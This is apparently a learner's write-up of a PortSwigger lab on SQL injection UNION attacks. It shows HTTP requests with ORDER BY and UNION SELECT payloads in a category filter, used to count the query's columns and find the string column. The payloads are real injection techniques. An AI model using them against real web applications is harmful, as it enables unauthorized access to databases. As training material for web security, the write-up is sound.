# Lab 04: SQL injection UNION attack, finding a column containing text

## Description

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

---

## Solution

### Determining the number of columns

By sending incremental `ORDER BY` clauses, I found that the original `SELECT` statement is returning 3 columns, since I received an error when trying to order by the column at index 4.

No error:

```http
GET /filter?category=Pets'+ORDER+BY+3-- HTTP/1.1
Host: ac621ff31ec5653280e22bd900be006f.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 6553
```

Error:

```http
GET /filter?category=Pets'+ORDER+BY+4-- HTTP/1.1
Host: ac621ff31ec5653280e22bd900be006f.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

The objective is to determine which column from the original `SELECT` statement's results is a string and to use the string `Jyoewi` to do so. By iteratively attempting a `UNION SELECT` with all `NULL` columns except for one, it appears that the second column has data type string.

```http
GET /filter?category=Pets'+UNION+SELECT+NULL,'Jyoewi',NULL-- HTTP/1.1
Host: ac621ff31ec5653280e22bd900be006f.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

From further analysis, it appears that the original `SELECT` statement is:

```sql
SELECT id, name, price FROM products WHERE category = 'CATEGORY'
```